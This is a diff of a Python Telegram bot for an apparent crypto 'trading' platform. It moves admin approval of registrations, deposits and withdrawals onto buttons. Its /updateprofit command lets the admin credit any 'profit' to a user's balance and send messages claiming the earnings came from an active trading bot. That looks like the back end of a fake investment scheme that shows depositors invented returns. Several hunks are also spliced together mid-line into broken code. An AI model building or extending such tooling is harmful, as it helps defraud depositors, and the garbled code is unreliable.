@@ -18,7 +18,7 @@ logger = logging.getLogger(__name__)
 # States for conversation handler
 (WAITING_NAME, WAITING_EMAIL, WAITING_PHONE, MAIN_MENU, 
  DEPOSIT_AMOUNT, DEPOSIT_PROOF, WITHDRAW_AMOUNT, WITHDRAW_CRYPTO_ADDRESS,
- WITHDRAW_BANK_NAME, WITHDRAW_ACCOUNT, WITHDRAW_ROUTING) = range(11)
+ WITHDRAW_BANK_NAME, WITHDRAW_ACCOUNT, WITHDRAW_ROUTING, ADMIN_STATE) = range(12)
 
 # Bot configuration
 BOT_TOKEN = os.getenv('BOT_TOKEN')
@@ -140,6 +140,7 @@ async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     user_info = get_user_data(user_id)
     user_info['phone'] = update.message.text.strip()
     
+    # Send admin notification with approve button
     admin_message = f"""📝 **New User Registration**
 
 👤 **Name:** {user_info['name']}
@@ -148,29 +149,79 @@ async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
 🆔 **User ID:** {user_id}
 
 Please create an account for this user on novacapitalwealthpro.com and send them the login details.
-Use /approveuser {user_id} to approve this account."""
+Click 'Approve User' to approve this account."""
+    
+    keyboard = [
+        [InlineKeyboardButton("✅ Approve User", callback_data=f'approve_user_{user_id}')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
     
     try:
         await context.bot.send_message(
             chat_id=ADMIN_USER_ID,
             text=admin_message,
+            reply_markup=reply_markup,
             parse_mode='Markdown'
         )
     except TelegramError as e:
         logger.error(f"Failed to send admin notification: {e}")
     
-    keyboard = [
-        [InlineKeyboardButton("✅ Proceed", callback_data='proceed_to_menu')],
-        [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    
     await update.message.reply_text(
-        f"Welcome, {user_info['name']}! Your registration is awaiting admin confirmation. You'll be notified once approved.",
-        reply_markup=reply_markup
+        f"Welcome, {user_info['name']}! Your registration is awaiting admin confirmation. You'll be notified once approved."
     )
     
-    return MAIN_MENU
+    return ConversationHandler.END
+
+async def handle_user_approval(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Handle admin's user approval via button"""
+    query = update.callback_query
+    await query.answer()
+    
+    if update.effective_user.id != ADMIN_USER_ID:
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="❌ Unauthorized access."
+        )
+        return
+    
+    try:
+        user_id = int(query.data.split('_')[-1])
+        
+        if user_id not in user_data:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text="❌ User not found."
+            )
+            return
+        
+        user_info = get_user_data(user_id)
+        user_info['approved'] = True
+        
+        # Send approval message with proceed button to user
+        keyboard = [
+            [InlineKeyboardButton("✅ Proceed to Dashboard", callback_data='proceed_to_menu')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id,
+                text=f"🎉 Great news {user_info['name']}! Your account has been approved. You can now access all trading features. Click 'Proceed to Dashboard' to continue.",
+                reply_markup=reply_markup
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id}: {e}")
+        
+        await query.edit_message_text(
+            f"{query.message.text}\n\n✅ **User Approved** - {user_info['name']} (ID: {user_id})"
+        )
+        
+    except (ValueError, IndexError) as e:
+        logger.error(f"Error in user approval: {e}")
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="❌ Invalid format."
+        )
 
 async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Display the main menu"""
@@ -181,6 +232,7 @@ async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
             text="Admins cannot access user features. Use admin commands like /adminpanel or /listusers."
         )
         return ConversationHandler.END
+    
     user_info = get_user_data(user_id)
     
     if not user_info['approved']:
@@ -212,15 +264,12 @@ async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
-    if update.callback_query:
-        await context.bot.send_message(
-            chat_id=update.effective_chat.id,
-            text=menu_text,
-            reply_markup=reply_markup,
-            parse_mode='Markdown'
-        )
-    else:
-        await update.message.reply_text(menu_text, reply_markup=reply_markup, parse_mode='Markdown')
+    await context.bot.send_message(
+        chat_id=update.effective_chat.id,
+        text=menu_text,
+        reply_markup=reply_markup,
+        parse_mode='Markdown'
+    )
     
     return MAIN_MENU
 
@@ -398,7 +447,7 @@ async def get_deposit_proof(update: Update, context: ContextTypes.DEFAULT_TYPE) 
 📱 **Phone:** {user_info['phone']}
 📧 **Email:** {user_info['email']}
 
-Click 'Approve' to confirm this deposit or use /approve {user_id} {amount:.2f}."""
+Click 'Approve' to confirm this deposit."""
     
     keyboard = [
         [InlineKeyboardButton("✅ Approve", callback_data=f'confirm_deposit_{user_id}_{amount}')]
@@ -437,7 +486,7 @@ Click 'Approve' to confirm this deposit or use /approve {user_id} {amount:.2f}."
     )
     return MAIN_MENU
 
-async def handle_deposit_confirmation(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+async def handle_deposit_confirmation(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     """Handle admin's deposit confirmation via button"""
     query = update.callback_query
     await query.answer()
@@ -447,19 +496,19 @@ async def handle_deposit_confirmation(update: Update, context: ContextTypes.DEFA
             chat_id=update.effective_chat.id,
             text="❌ Unauthorized access."
         )
-        return MAIN_MENU
+        return
     
     try:
-        _, user_id_str, amount_str = query.data.split('_')
-        user_id = int(user_id_str)
-        amount = float(amount_str)
+        parts = query.data.split('_')
+        user_id = int(parts[2])
+        amount = float(parts[3])
         
         if user_id not in user_data:
             await context.bot.send_message(
                 chat_id=update.effective_chat.id,
                 text="❌ User not found."
             )
-            return MAIN_MENU
+            return
         
         user_info = get_user_data(user_id)
         user_info['balance'] += amount
@@ -478,14 +527,12 @@ async def handle_deposit_confirmation(update: Update, context: ContextTypes.DEFA
             f"{query.message.text}\n\n✅ **Deposit Approved** for user {user_id}."
         )
         
-        return MAIN_MENU
-        
-    except ValueError:
+    except (ValueError, IndexError) as e:
+        logger.error(f"Error in deposit confirmation: {e}")
         await context.bot.send_message(
             chat_id=update.effective_chat.id,
             text="❌ Invalid format."
         )
-        return MAIN_MENU
 
 async def handle_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Handle withdrawal request"""
@@ -607,78 +654,6 @@ async def get_crypto_address(update: Update, context: ContextTypes.DEFAULT_TYPE)
     
     user_info = get_user_data(user_id)
     amount = context.user_data['withdraw_amount']
-    address = context.user_data['crypto_address']
-    
-    admin_message = f"""💸 **Crypto Withdrawal Request**
-
-👤 **User:** {user_info['name']} (ID: {user_id})
-💰 **Amount:** ${amount:.2f}
-🏦 **Crypto Address:** {address}
-📱 **Phone:** {user_info['phone']}
-📧 **Email:** {user_info['email']}
-
-Use /approvewithdrawal {user_id} {amount} to approve this withdrawal."""
-    
-    try:
-        await context.bot.send_message(
-            chat_id=ADMIN_USER_ID,
-            text=admin_message,
-            parse_mode='Markdown'
-        )
-    except TelegramError as e:
-        logger.error(f"Failed to send admin notification: {e}")
-        await update.message.reply_text(
-            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-        )
-        return MAIN_MENU
-    
-    user_info['pending_withdrawal'] = amount
-    
-    await update.message.reply_text(
-        "Your withdrawal request is pending admin confirmation.",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-    )
-    return MAIN_MENU
-
-async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get bank name"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['bank_name'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your account number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ACCOUNT
-
-async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get account number"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['account_number'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your routing number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ROUTING
-
-async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get routing number and process bank withdrawal"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['routing_number'] = update.message.text.strip()
-    
-    user_info = get_user_data(user_id)
-    amount = context.user_data['withdraw_amount']
     bank_name = context.user_data['bank_name']
     account_number = context.user_data['account_number']
     routing_number = context.user_data['routing_number']
@@ -693,12 +668,18 @@ async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE)
 📱 **Phone:** {user_info['phone']}
 📧 **Email:** {user_info['email']}
 
-Use /approvewithdrawal {user_id} {amount} to approve this withdrawal."""
+Click 'Approve' to process this withdrawal."""
+    
+    keyboard = [
+        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
     
     try:
         await context.bot.send_message(
             chat_id=ADMIN_USER_ID,
             text=admin_message,
+            reply_markup=reply_markup,
             parse_mode='Markdown'
         )
     except TelegramError as e:
@@ -716,6 +697,62 @@ Use /approvewithdrawal {user_id} {amount} to approve this withdrawal."""
         reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
     )
     return MAIN_MENU
+
+async def handle_withdrawal_approval(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Handle admin's withdrawal approval via button"""
+    query = update.callback_query
+    await query.answer()
+    
+    if update.effective_user.id != ADMIN_USER_ID:
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="❌ Unauthorized access."
+        )
+        return
+    
+    try:
+        parts = query.data.split('_')
+        user_id = int(parts[2])
+        amount = float(parts[3])
+        
+        if user_id not in user_data:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text="❌ User not found."
+            )
+            return
+        
+        user_info = get_user_data(user_id)
+        
+        if amount > user_info['balance']:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text="❌ Insufficient user balance."
+            )
+            return
+        
+        user_info['balance'] -= amount
+        user_info['withdrawal'] += amount
+        user_info['pending_withdrawal'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id,
+                text=f"✅ Your withdrawal of ${amount:.2f} has been processed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id}: {e}")
+        
+        await query.edit_message_text(
+            f"{query.message.text}\n\n✅ **Withdrawal Approved** for user {user_id}."
+        )
+        
+    except (ValueError, IndexError) as e:
+        logger.error(f"Error in withdrawal approval: {e}")
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="❌ Invalid format."
+        )
 
 async def show_copy_trade(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Show copy trading options"""
@@ -950,12 +987,12 @@ async def get_id(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         return
     await update.message.reply_text(f"Your User ID is: {user_id}")
 
-async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Show admin panel with options"""
     user_id = update.effective_user.id
     if user_id != ADMIN_USER_ID:
         await update.message.reply_text("❌ Unauthorized access.")
-        return
+        return ConversationHandler.END
     
     panel_text = """🛠 **NCW Trading Bot Admin Panel** 🛠
 
@@ -963,9 +1000,6 @@ Welcome to the admin control center. Manage users, transactions, and system sett
     
     keyboard = [
         [InlineKeyboardButton("👥 List Users", callback_data='admin_list_users')],
-        [InlineKeyboardButton("✅ Approve User", callback_data='admin_approve_user')],
-        [InlineKeyboardButton("💳 Approve Deposit", callback_data='admin_approve_deposit')],
-        [InlineKeyboardButton("💸 Approve Withdrawal", callback_data='admin_approve_withdrawal')],
         [InlineKeyboardButton("📈 Update Profit", callback_data='admin_update_profit')],
         [InlineKeyboardButton("🪙 Update Crypto Address", callback_data='admin_update_crypto')],
         [InlineKeyboardButton("ℹ️ Help", callback_data='admin_help')]
@@ -973,8 +1007,9 @@ Welcome to the admin control center. Manage users, transactions, and system sett
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     await update.message.reply_text(panel_text, reply_markup=reply_markup, parse_mode='Markdown')
+    return ADMIN_STATE
 
-async def handle_admin_action(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+async def handle_admin_action(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Handle admin panel button actions"""
     query = update.callback_query
     await query.answer()
@@ -985,7 +1020,7 @@ async def handle_admin_action(update: Update, context: ContextTypes.DEFAULT_TYPE
             chat_id=update.effective_chat.id,
             text="❌ Unauthorized access."
         )
-        return
+        return ConversationHandler.END
     
     action = query.data
     
@@ -995,22 +1030,142 @@ async def handle_admin_action(update: Update, context: ContextTypes.DEFAULT_TYPE
                 chat_id=update.effective_chat.id,
                 text="📝 No users registered yet."
             )
-            return
+            return ADMIN_STATE
         
         users_list = """👥 **Registered Users** 👥
 
 Below is a detailed list of all registered users:\n\n"""
-        for user_id, data in user_data.items():
+        for user_id_key, data in user_data.items():
             status = "✅ Approved" if data['approved'] else "⏳ Pending"
             bot = data['active_bot'] if data['active_bot'] else "None"
             pending_dep = f"${data['pending_deposit']:.2f}" if data['pending_deposit'] > 0 else "None"
             pending_with = f"${data['pending_withdrawal']:.2f}" if data['pending_withdrawal'] > 0 else "None"
             
-            users_list += f"🆔 **{user_id}** - {data['name']}\n"
+            users_list += f"🆔 **{user_id_key}** - {data['name']}\n"
             users_list += f"📧 {data['email']}\n"
             users_list += f"📱 {data['phone']}\n"
             users_list += f"💰 Balance: ${data['balance']:.2f}\n"
             users_list += f"📈 Deposit: ${data['deposit']:.2f}\n"
+        users_list += f"📊 Profit: ${data['profit']:.2f}\n"
+        users_list += f"📉 Withdrawal: ${data['withdrawal']:.2f}\n"
+        users_list += f"📊 Status: {status}\n"
+        users_list += f"🤖 Active Bot: {bot}\n"
+        users_list += f"💳 Pending Deposit: {pending_dep}\n"
+        users_list += f"💸 Pending Withdrawal: {pending_with}\n"
+        users_list += "━━━━━━━━━━━━━━━━━━━━\n"
+    
+    if len(users_list) > 4000:
+        parts = [users_list[i:i+4000] for i in range(0, len(users_list), 4000)]
+        for part in parts:
+            await update.message.reply_text(part, parse_mode='Markdown')
+    else:
+        await update.message.reply_text(users_list, parse_mode='Markdown')
+
+async def admin_help(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Show admin commands"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    help_text = """🛠 **Admin Panel Guide** 🛠
+
+Welcome to the NCW Trading Bot Admin Panel. Below are the available actions and how to use them:
+
+👥 **List Users**
+- View all registered users with details (ID, name, email, balance, etc.).
+- Use the 'List Users' button or /listusers.
+
+✅ **User Approval**
+- New user registrations will send you a notification with an 'Approve User' button.
+- Click the button to approve users automatically.
+
+💳 **Deposit Approval**
+- Deposit requests will send you a notification with an 'Approve' button.
+- Click the button to confirm deposits automatically.
+
+💸 **Withdrawal Approval**
+- Withdrawal requests will send you a notification with an 'Approve' button.
+- Click the button to process withdrawals automatically.
+
+📈 **Update Profit**
+- Add profit to a user's account based on trading bot performance.
+- Command: /updateprofit <user_id> <amount>
+- Example: /updateprofit 123456789 250.75
+
+🪙 **Update Crypto Address**
+- Change the wallet address for a cryptocurrency.
+- Command: /updatecrypto <crypto_name> <address>
+- Example: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
+
+ℹ️ **Help**
+- Review this guide anytime with /adminhelp or the 'Help' button.
+
+**Tips:**
+- Use /getid to find a user's ID.
+- Most approvals now work with buttons for easier management.
+- All commands are case-sensitive."""
+    
+    await update.message.reply_text(help_text, parse_mode='Markdown')
+
+async def send_admin_panel(context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Send admin panel to admin on bot startup"""
+    panel_text = """🛠 **NCW Trading Bot Admin Panel** 🛠
+
+Welcome to the admin control center. The bot is now running and ready to handle user registrations and transactions.
+
+All approvals will be sent to you with easy-to-use buttons."""
+    
+    keyboard = [
+        [InlineKeyboardButton("👥 List Users", callback_data='admin_list_users')],
+        [InlineKeyboardButton("📈 Update Profit", callback_data='admin_update_profit')],
+        [InlineKeyboardButton("🪙 Update Crypto Address", callback_data='admin_update_crypto')],
+        [InlineKeyboardButton("ℹ️ Help", callback_data='admin_help')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    try:
+        await context.bot.send_message(
+            chat_id=ADMIN_USER_ID,
+            text=panel_text,
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
+    except TelegramError as e:
+        logger.error(f"Failed to send admin panel on startup: {e}")
+
+async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Handle errors"""
+    logger.error(f"Update {update} caused error {context.error}")
+    
+    if update and update.effective_message:
+        await update.effective_message.reply_text(
+            "⚠️ An error occurred. Please try again or contact support if the problem persists."
+        )
+
+def main() -> None:
+    """Start the bot and send admin panel"""
+    if not BOT_TOKEN:
+        logger.error("BOT_TOKEN environment variable not set!")
+        return
+    
+    if not ADMIN_USER_ID:
+        logger.error("ADMIN_USER_ID environment variable not set!")
+        return
+    
+    application = Application.builder().token(BOT_TOKEN).build()
+    
+    # Send admin panel on startup
+    application.job_queue.run_once(send_admin_panel, 1)
+    
+    # User conversation handler
+    user_conv_handler = ConversationHandler(
+        entry_points=[
+            CommandHandler("start", start),
+        ],
+        states={
+            WAITING_NAME: [
+                CallbackQueryHandler(start_registration, pattern='^start_registration:.2f}\n"
             users_list += f"📊 Profit: ${data['profit']:.2f}\n"
             users_list += f"📉 Withdrawal: ${data['withdrawal']:.2f}\n"
             users_list += f"📊 Status: {status}\n"
@@ -1034,75 +1189,23 @@ Below is a detailed list of all registered users:\n\n"""
                 parse_mode='Markdown'
             )
     
-    elif action == 'admin_approve_user':
-        if not user_data:
-            await context.bot.send_message(
-                chat_id=update.effective_chat.id,
-                text="📝 No users registered yet."
-            )
-            return
-        await context.bot.send_message(
-            chat_id=update.effective_chat.id,
-            text="Please enter the user ID to approve (use /getid to find IDs):",
-            reply_markup=create_cancel_keyboard()
-        )
-        context.user_data['admin_action'] = 'approve_user'
-    
-    elif action == 'admin_approve_deposit':
-        if not user_data:
-            await context.bot.send_message(
-                chat_id=update.effective_chat.id,
-                text="📝 No users registered yet."
-            )
-            return
-        await context.bot.send_message(
-            chat_id=update.effective_chat.id,
-            text="Please enter: /approve <user_id> <amount>",
-            reply_markup=create_cancel_keyboard()
-        )
-        context.user_data['admin_action'] = 'approve_deposit'
-    
-    elif action == 'admin_approve_withdrawal':
-        if not user_data:
-            await context.bot.send_message(
-                chat_id=update.effective_chat.id,
-                text="📝 No users registered yet."
-            )
-            return
-        await context.bot.send_message(
-            chat_id=update.effective_chat.id,
-            text="Please enter: /approvewithdrawal <user_id> <amount>",
-            reply_markup=create_cancel_keyboard()
-        )
-        context.user_data['admin_action'] = 'approve_withdrawal'
-    
     elif action == 'admin_update_profit':
         if not user_data:
             await context.bot.send_message(
                 chat_id=update.effective_chat.id,
                 text="📝 No users registered yet."
             )
-            return
+            return ADMIN_STATE
         await context.bot.send_message(
             chat_id=update.effective_chat.id,
-            text="Please enter: /updateprofit <user_id> <amount>",
-            reply_markup=create_cancel_keyboard()
+            text="Please use the command: /updateprofit <user_id> <amount>\n\nExample: /updateprofit 123456789 250.75"
         )
-        context.user_data['admin_action'] = 'update_profit'
     
     elif action == 'admin_update_crypto':
-        if not user_data:
-            await context.bot.send_message(
-                chat_id=update.effective_chat.id,
-                text="📝 No users registered yet."
-            )
-            return
         await context.bot.send_message(
             chat_id=update.effective_chat.id,
-            text="Please enter: /updatecrypto <crypto_name> <address>",
-            reply_markup=create_cancel_keyboard()
+            text="Please use the command: /updatecrypto <crypto_name> <address>\n\nExample: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
         )
-        context.user_data['admin_action'] = 'update_crypto'
     
     elif action == 'admin_help':
         help_text = """🛠 **Admin Panel Guide** 🛠
@@ -1113,21 +1216,17 @@ Welcome to the NCW Trading Bot Admin Panel. Below are the available actions and 
 - View all registered users with details (ID, name, email, balance, etc.).
 - Use the 'List Users' button or /listusers.
 
-✅ **Approve User**
-- Approve a user's account to grant access to trading features.
-- Command: /approveuser <user_id>
-- Example: /approveuser 123456789
+✅ **User Approval**
+- New user registrations will send you a notification with an 'Approve User' button.
+- Click the button to approve users automatically.
 
-💳 **Approve Deposit**
-- Confirm a user's deposit to update their balance.
-- Command: /approve <user_id> <amount>
-- Example: /approve 123456789 1000.50
-- Alternatively, use the 'Approve' button in deposit notifications.
+💳 **Deposit Approval**
+- Deposit requests will send you a notification with an 'Approve' button.
+- Click the button to confirm deposits automatically.
 
-💸 **Approve Withdrawal**
-- Process a user's withdrawal request.
-- Command: /approvewithdrawal <user_id> <amount>
-- Example: /approvewithdrawal 123456789 500.25
+💸 **Withdrawal Approval**
+- Withdrawal requests will send you a notification with an 'Approve' button.
+- Click the button to process withdrawals automatically.
 
 📈 **Update Profit**
 - Add profit to a user's account based on trading bot performance.
@@ -1144,13 +1243,15 @@ Welcome to the NCW Trading Bot Admin Panel. Below are the available actions and 
 
 **Tips:**
 - Use /getid to find a user's ID.
-- Check deposit notifications for pending approvals.
+- Most approvals now work with buttons for easier management.
 - All commands are case-sensitive."""
         await context.bot.send_message(
             chat_id=update.effective_chat.id,
             text=help_text,
             parse_mode='Markdown'
         )
+    
+    return ADMIN_STATE
 
 async def approve_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     """Admin command to approve deposits"""
@@ -1165,27 +1266,27 @@ async def approve_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
             await update.message.reply_text("Usage: /approve <user_id> <amount>")
             return
         
-        user_id = int(args[0])
+        user_id_target = int(args[0])
         amount = float(args[1])
         
-        if user_id not in user_data:
+        if user_id_target not in user_data:
             await update.message.reply_text("❌ User not found.")
             return
         
-        user_info = user_data[user_id]
+        user_info = user_data[user_id_target]
         user_info['balance'] += amount
         user_info['deposit'] += amount
         user_info['pending_deposit'] = 0
         
         try:
             await context.bot.send_message(
-                chat_id=user_id,
+                chat_id=user_id_target,
                 text=f"✅ Your deposit of ${amount:.2f} has been confirmed! Your new balance is ${user_info['balance']:.2f}."
             )
         except TelegramError as e:
-            logger.error(f"Failed to notify user {user_id}: {e}")
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
         
-        await update.message.reply_text(f"✅ Approved ${amount:.2f} deposit for user {user_id}.")
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} deposit for user {user_id_target}.")
         
     except (ValueError, IndexError):
         await update.message.reply_text("❌ Invalid format. Usage: /approve <user_id> <amount>")
@@ -1203,14 +1304,14 @@ async def approve_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE)
             await update.message.reply_text("Usage: /approvewithdrawal <user_id> <amount>")
             return
         
-        user_id = int(args[0])
+        user_id_target = int(args[0])
         amount = float(args[1])
         
-        if user_id not in user_data:
+        if user_id_target not in user_data:
             await update.message.reply_text("❌ User not found.")
             return
         
-        user_info = user_data[user_id]
+        user_info = user_data[user_id_target]
         
         if amount > user_info['balance']:
             await update.message.reply_text("❌ Insufficient user balance.")
@@ -1222,13 +1323,13 @@ async def approve_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE)
         
         try:
             await context.bot.send_message(
-                chat_id=user_id,
+                chat_id=user_id_target,
                 text=f"✅ Your withdrawal of ${amount:.2f} has been processed! Your new balance is ${user_info['balance']:.2f}."
             )
         except TelegramError as e:
-            logger.error(f"Failed to notify user {user_id}: {e}")
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
         
-        await update.message.reply_text(f"✅ Approved ${amount:.2f} withdrawal for user {user_id}.")
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} withdrawal for user {user_id_target}.")
         
     except (ValueError, IndexError):
         await update.message.reply_text("❌ Invalid format. Usage: /approvewithdrawal <user_id> <amount>")
@@ -1246,26 +1347,26 @@ async def update_profit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
             await update.message.reply_text("Usage: /updateprofit <user_id> <amount>")
             return
         
-        user_id = int(args[0])
+        user_id_target = int(args[0])
         amount = float(args[1])
         
-        if user_id not in user_data:
+        if user_id_target not in user_data:
             await update.message.reply_text("❌ User not found.")
             return
         
-        user_info = user_data[user_id]
+        user_info = user_data[user_id_target]
         user_info['profit'] += amount
         user_info['balance'] += amount
         
         try:
             await context.bot.send_message(
-                chat_id=user_id,
+                chat_id=user_id_target,
                 text=f"🎉 Congratulations! You've earned ${amount:.2f} in profits from your active trading bot. Your new balance is ${user_info['balance']:.2f}."
             )
         except TelegramError as e:
-            logger.error(f"Failed to notify user {user_id}: {e}")
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
         
-        await update.message.reply_text(f"✅ Added ${amount:.2f} profit for user {user_id}.")
+        await update.message.reply_text(f"✅ Added ${amount:.2f} profit for user {user_id_target}.")
         
     except (ValueError, IndexError):
         await update.message.reply_text("❌ Invalid format. Usage: /updateprofit <user_id> <amount>")
@@ -1309,24 +1410,30 @@ async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
             await update.message.reply_text("Usage: /approveuser <user_id>")
             return
         
-        user_id = int(args[0])
+        user_id_target = int(args[0])
         
-        if user_id not in user_data:
+        if user_id_target not in user_data:
             await update.message.reply_text("❌ User not found.")
             return
         
-        user_info = user_data[user_id]
+        user_info = user_data[user_id_target]
         user_info['approved'] = True
+        
+        keyboard = [
+            [InlineKeyboardButton("✅ Proceed to Dashboard", callback_data='proceed_to_menu')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
         
         try:
             await context.bot.send_message(
-                chat_id=user_id,
-                text=f"🎉 Great news {user_info['name']}! Your account has been approved. You can now visit our website and use all trading features."
+                chat_id=user_id_target,
+                text=f"🎉 Great news {user_info['name']}! Your account has been approved. You can now access all trading features. Click 'Proceed to Dashboard' to continue.",
+                reply_markup=reply_markup
             )
         except TelegramError as e:
-            logger.error(f"Failed to notify user {user_id}: {e}")
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
         
-        await update.message.reply_text(f"✅ Approved account for user {user_id} ({user_info['name']}).")
+        await update.message.reply_text(f"✅ Approved account for user {user_id_target} ({user_info['name']}).")
         
     except (ValueError, IndexError):
         await update.message.reply_text("❌ Invalid format. Usage: /approveuser <user_id>")
@@ -1345,44 +1452,140 @@ async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None
     users_list = """👥 **Registered Users** 👥
 
 Below is a detailed list of all registered users:\n\n"""
-    for user_id, data in user_data.items():
+    for user_id_key, data in user_data.items():
         status = "✅ Approved" if data['approved'] else "⏳ Pending"
         bot = data['active_bot'] if data['active_bot'] else "None"
         pending_dep = f"${data['pending_deposit']:.2f}" if data['pending_deposit'] > 0 else "None"
         pending_with = f"${data['pending_withdrawal']:.2f}" if data['pending_withdrawal'] > 0 else "None"
         
-        users_list += f"🆔 **{user_id}** - {data['name']}\n"
+        users_list += f"🆔 **{user_id_key}** - {data['name']}\n"
         users_list += f"📧 {data['email']}\n"
         users_list += f"📱 {data['phone']}\n"
         users_list += f"💰 Balance: ${data['balance']:.2f}\n"
-        users_list += f"📈 Deposit: ${data['deposit']:.2f}\n"
-        users_list += f"📊 Profit: ${data['profit']:.2f}\n"
-        users_list += f"📉 Withdrawal: ${data['withdrawal']:.2f}\n"
-        users_list += f"📊 Status: {status}\n"
-        users_list += f"🤖 Active Bot: {bot}\n"
-        users_list += f"💳 Pending Deposit: {pending_dep}\n"
-        users_list += f"💸 Pending Withdrawal: {pending_with}\n"
-        users_list += "━━━━━━━━━━━━━━━━━━━━\n"
+        users_list += f"📈 Deposit: ${data['deposit']
+    address = context.user_data['crypto_address']
     
-    if len(users_list) > 4000:
-        parts = [users_list[i:i+4000] for i in range(0, len(users_list), 4000)]
-        for part in parts:
+    admin_message = f"""💸 **Crypto Withdrawal Request**
+
+👤 **User:** {user_info['name']} (ID: {user_id})
+💰 **Amount:** ${amount:.2f}
+🏦 **Crypto Address:** {address}
+📱 **Phone:** {user_info['phone']}
+📧 **Email:** {user_info['email']}
+
+Click 'Approve' to process this withdrawal."""
+    
+    keyboard = [
+        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    try:
+        await context.bot.send_message(
+            chat_id=ADMIN_USER_ID,
+            text=admin_message,
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
+    except TelegramError as e:
+        logger.error(f"Failed to send admin notification: {e}")
+        await update.message.reply_text(
+            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+        )
+        return MAIN_MENU
+    
